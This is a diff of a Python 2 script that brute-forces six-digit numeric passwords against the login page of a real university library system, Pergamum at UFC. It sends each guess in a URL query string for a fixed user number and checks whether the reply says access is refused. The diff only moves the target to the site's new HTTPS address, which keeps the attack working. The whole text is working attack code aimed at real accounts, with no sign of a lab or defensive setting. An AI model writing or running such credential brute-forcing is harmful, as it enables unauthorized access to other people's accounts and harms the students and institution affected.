@@ -13,7 +13,7 @@ for i in range(a, b + 1):
     # sequencia para '0000##'
     if (a < 9) and (b >= 9):
         z = '00000' + str(i)
-        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao) + "&password=" + str(z) + "&button=Acessar&numero_mestre="
+        url = "https://pergamum.ufc.br/pergamum/biblioteca_s/meu_pergamum/index.php?flag=index.php&login=" + str(inscricao) + "&password=" + str(z) + "&button=Acessar&numero_mestre="
         webUrl = urllib2.urlopen(url)
         data = webUrl.read()
         if data == "Acesso não autorizado!":
@@ -24,7 +24,7 @@ for i in range(a, b + 1):
     # sequencia para '000###'
     if (a < 1000) and (b >= 100):
         z = '000' + str(i)
-        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
+        url = "https://pergamum.ufc.br/pergamum/biblioteca_s/meu_pergamum/index.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
         webUrl=urllib2.urlopen(url)
         data=webUrl.read()
         if data == "Acesso não autorizado!":
@@ -35,7 +35,7 @@ for i in range(a, b + 1):
     # sequencia para '00####'
     if (a < 10000) and (b >= 1000):
         z = '00' + str(i)
-        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
+        url = "https://pergamum.ufc.br/pergamum/biblioteca_s/meu_pergamum/index.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
         webUrl=urllib2.urlopen(url)
         data=webUrl.read()
         if data == "Acesso não autorizado!":
@@ -46,7 +46,7 @@ for i in range(a, b + 1):
     # sequencia para '0#####'
     if (a < 100000) and (b >= 10000):
         z = '0' + str(i)
-        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
+        url = "https://pergamum.ufc.br/pergamum/biblioteca_s/meu_pergamum/index.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
         webUrl=urllib2.urlopen(url)
         data=webUrl.read()
         if data == "Acesso não autorizado!":
@@ -57,7 +57,7 @@ for i in range(a, b + 1):
     # sequencia para '######' 6 digitos(full)
     if (a < 1000000) and (b >= 100000):
         z = str(i)
-        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
+        url = "https://pergamum.ufc.br/pergamum/biblioteca_s/meu_pergamum/index.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
         webUrl=urllib2.urlopen(url)
         data=webUrl.read()
         if data == "Acesso não autorizado!":
